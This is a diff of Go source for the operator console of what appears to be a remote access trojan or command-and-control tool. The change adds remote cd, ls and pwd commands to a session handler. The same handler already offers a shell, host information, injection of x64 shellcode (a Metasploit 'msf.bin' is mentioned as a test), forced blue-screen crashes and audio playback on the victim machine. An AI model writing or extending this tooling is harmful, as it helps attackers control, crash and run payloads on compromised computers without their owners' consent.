@@ -123,6 +123,12 @@ func openSession(id int, sl *SessionList) {
 		playMatch := playRegex.FindString(command)
 		loadRegex := regexp.MustCompile(`load .+`)
 		loadMatch := loadRegex.FindString(command)
+		cdRegex := regexp.MustCompile(`cd .+`)
+		cdMatch := cdRegex.FindString(command)
+		if cdMatch != "" {
+			dir2go := strings.Split(command, " ")[1]
+			cd(&current.Conn, dir2go)
+		}
 		if playMatch != "" {
 			audioFile := strings.Split(command, " ")[1]
 			playAudio(&current.Conn, audioFile)
@@ -154,8 +160,14 @@ func openSession(id int, sl *SessionList) {
 		case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
 			fmt.Println("Usage: play <x64ShellcodeFile>")
 			//load(&current.Conn, "msf.bin") //Test Case. Success
+		case "cd":
+			fmt.Println("Usage: cd <dir>") //Works with relative and absolute paths
+		case "ls":
+			ls(&current.Conn)
+		case "pwd":
+			pwd(&current.Conn)
 		default:
-			fmt.Println("\nUsage: shell, hostinfo, bsod, bg\n")
+			fmt.Println("\nUsage: shell, hostinfo, load, bsod, cd, ls, pwd, bg\n")
 		}
 	}
 }
